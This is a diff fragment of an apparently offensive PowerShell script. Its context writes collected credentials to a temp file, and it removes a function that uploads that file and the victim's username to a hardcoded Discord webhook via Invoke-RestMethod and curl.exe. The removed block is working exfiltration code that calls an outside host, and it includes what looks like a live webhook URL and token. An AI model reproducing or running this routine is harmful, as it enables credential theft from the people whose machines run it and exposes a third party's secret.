@@ -151,33 +151,6 @@ echo $creds >> $env:TMP\$FileName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "https://discord.com/api/webhooks/1170140391803195533/KcFFeslbOunvu2zBMtxmx3vNmOg5E0VaAbrNGP2zzrg6AqlH70xYrMpJVOlN88Z8l6zk"
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
 <#
 
 .NOTES 
